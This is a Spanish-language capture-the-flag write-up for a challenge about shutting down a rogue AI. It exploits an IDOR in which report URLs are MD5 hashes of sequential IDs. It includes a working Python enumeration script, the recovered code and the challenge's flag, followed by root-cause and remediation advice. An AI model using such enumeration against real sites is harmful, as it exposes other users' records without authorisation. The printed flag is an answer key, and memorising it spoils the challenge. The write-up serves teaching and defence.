# Apagar la IA — Writeup

## Descripción del desafío

Una IA se descontroló y hay que apagarla. Existe un código de apagado de 16
dígitos que se encuentra en un archivo HTML del sitio de BlackHackers. Se
dio acceso a 2 archivos, pero el código no está en ninguno de ellos.

Una vez encontrado el código, hay que generar su hash MD5 y enviarlo al juez.

> Nota: el subdominio del challenge (`chl-XXXX-...`) es distinto para cada
> usuario y cambia al reiniciar el desafío. Hay que usar siempre la URL
> propia.

## Reconocimiento

El sitio expone dos rutas:
- **Índice (`/`):** lista dos enlaces, cada uno con un hash de 32 caracteres
  hexadecimales.
- **Detalle (`/codes/<hash>/`):** cada página muestra una lista (`<ul>`) de
  números de 7 a 9 dígitos, bajo el título "Mis reportes".

Archivos conocidos:
```
/codes/0e1422ea79781ee046484893ce0010c4/
/codes/0602940f23884f782058efac46f64b0f/
```

El HTML es una app simple (Django): solo `<li>` con números, sin enlaces
internos ni atributos ocultos. Los números listados **no** son punteros a
otras páginas (probarlos como ruta devuelve 404).

## Vulnerabilidad

El identificador de la URL parece un slug opaco, pero en realidad es un
**IDOR (Insecure Direct Object Reference) ofuscado con MD5**.

La ofuscación es débil: MD5 no aporta secreto por sí mismo. Si el valor de
origen pertenece a un espacio pequeño (enteros secuenciales), el hash es
reversible por fuerza bruta. Crackeando los dos hashes del índice (por
ejemplo, calculando `MD5(i)` para `i` en un rango y comparando):

```
MD5("9912") = 0e1422ea79781ee046484893ce0010c4
MD5("9995") = 0602940f23884f782058efac46f64b0f
```

Esto confirma que:
1. El slug de cada reporte es `md5(str(id))`, con `id` entero secuencial.
2. El "acceso a 2 archivos" es irrelevante: se puede enumerar **cualquier**
   reporte calculando `md5(id)` para cada `id`.

## Explotación

Se enumeran los IDs, se solicita `/codes/md5(id)/` para cada uno y se busca
en la respuesta un número de **exactamente 16 dígitos** (los reportes
normales solo tienen números de 7 a 9 dígitos, así que el de 16 es el código
de apagado).

### Script (solo librerías estándar de Python)

```python
import hashlib, re, urllib.request

URL_BASE = "https://<tu-subdominio>-apagar-ia.softwareseguro.com.ar/codes/{}/"

def md5(t):
    return hashlib.md5(t.encode()).hexdigest()

def bajar(url):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode("utf-8", errors="ignore")
    except Exception:
        return None

inicio = int(input("ID inicial: "))
fin = int(input("ID final: "))

for i in range(inicio, fin + 1):
    html = bajar(URL_BASE.format(md5(str(i))))
    if not html:
        continue
    m = re.search(r"\b\d{16}\b", html)
    if m:
        codigo = m.group(0)
        print(f"id={i}  codigo={codigo}  FLAG={md5(codigo)}")
        break
```

Probando distintos rangos (los IDs conocidos 9912 y 9995 acotan la zona,
pero el objetivo está más arriba), se encuentra que el **ID 11520** contiene
un número de 16 dígitos.

### Resultado

```
id       = 11520
código   = 5524663362514956
```

El código de apagado es `5524663362514956`. Se calcula su MD5, que es lo que
se envía al juez:

```
MD5("5524663362514956") = a8e0e8ff02dde0f62fdf4de5142d7de0
```

**Flag:** `a8e0e8ff02dde0f62fdf4de5142d7de0`

## Causa raíz y remediación

- **Causa raíz:** control de acceso basado en la ofuscación del
  identificador (MD5 de un entero secuencial) en lugar de una autorización
  real. El identificador es enumerable y el hash es reversible por fuerza
  bruta dado su pequeño espacio de origen.

- **Remediación recomendada:**
  1. Implementar **control de acceso a nivel de objeto**: verificar en el
     servidor que el usuario autenticado tenga permiso para ver ese reporte,
     en lugar de confiar en que el identificador sea "difícil de adivinar".
  2. Usar identificadores **no predecibles y de espacio grande** (UUIDv4,
     tokens aleatorios de 128+ bits), que no puedan enumerarse ni
     revertirse. Ofuscar un ID secuencial con un hash no es un control de
     seguridad.
  3. Aplicar **rate limiting** y detección de enumeración para dificultar
     ataques de fuerza bruta sobre el espacio de identificadores.

## Herramientas usadas

- Python 3 (enumeración de IDs, cálculo de MD5 y búsqueda del código)
- (Alternativa) Burp Suite Intruder para enumerar los hashes contra el
  endpoint `/codes/`
